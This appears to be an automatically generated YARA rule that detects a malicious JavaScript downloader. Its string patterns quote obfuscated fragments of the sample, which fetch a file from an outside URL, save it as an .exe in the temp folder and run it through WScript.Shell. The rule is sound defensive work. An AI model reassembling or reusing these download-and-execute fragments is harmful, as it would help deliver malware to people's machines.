rule sig_20160328_4a97db8b3064018b1cad9e165964a53f {
  meta:
    description = "datamaliciousorder - file 20160328_4a97db8b3064018b1cad9e165964a53f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "21e32ef23ae4f793944524019c31b0f4cc0ed49bd68be453ec3a6a99734da63f"

  strings:
    $s1  = "function Vgxdqsqki() {return Csaqzecf[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"fpOeSOBR2KZ.exe\";};" fullword ascii
    $s2  = "Umguvsp[Hozgt](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "do {WScript[Ydhwrvhcx](Apqvz() * 11)} while (Umguvsp[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Csaqzecf = function Fewtbegcwr() {return WScript[Iachtbvcb](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Rlzbyt(Dyfuike, Aimwtgni){return Dyfuike - Aimwtgni;};" fullword ascii
    $s6  = "function Uqwiwcqtqv() {return ((Dcgzt == true) && (Dcgzt == Tdvbw)) ? 1 : Edrdjlae;};" fullword ascii
    $s7  = "function Feqxex(Vydmgf){Csaqzecf[\"Run\"](Vydmgf, Edrdjlae, Edrdjlae);};" fullword ascii
    $s8  = "function Apqvz(){return 22;};" fullword ascii
    $s9  = "var Dcgzt = false;" fullword ascii
    $s10 = "function Jxnvcouq(){return Xdjlnsnnpc;};" fullword ascii
    $s11 = "return Rlzbyt(Zunjejg, Baypi);" fullword ascii
    $s12 = "var Lhfhpsprrg = new this[\"Date\"]();" fullword ascii
    $s13 = "function Dlgniyfqeg()" fullword ascii
    $s14 = "Tdvbw = true; " fullword ascii
    $s15 = "var Tdvbw = false;" fullword ascii
    $s16 = "var Dkylrl = false;" fullword ascii
    $s17 = "function Ahmuhjkrs(){return Iachtbvcb;};" fullword ascii
    $s18 = " while (Omwnbnvxy){" fullword ascii
    $s19 = "function Dznlulfc(Gfppvzbcn) {var Zveuxmrtp = (1, 2, 3, 4, 5, Gfppvzbcn); return Zveuxmrtp;};" fullword ascii
    $s20 = "Dcgzt = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}